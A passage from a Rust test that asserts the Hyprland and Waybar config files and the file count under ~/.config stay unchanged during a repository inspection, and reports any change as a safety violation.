    let final_waybar_bytes = fs::read(&waybar_conf).unwrap();
    let final_file_count = count_files_recursive(config_dir.as_std_path());

    assert_eq!(
        initial_hypr_bytes, final_hypr_bytes,
        "Safety violation: ~/.config/hypr/hyprland.conf was modified during repository inspection!"
    );
    assert_eq!(
        initial_waybar_bytes, final_waybar_bytes,
        "Safety violation: ~/.config/waybar/config.jsonc was modified during repository inspection!"
    );
    assert_eq!(
        initial_file_count, final_file_count,
        "Safety violation: files were created or deleted in ~/.config during repository inspection!"
    );
}
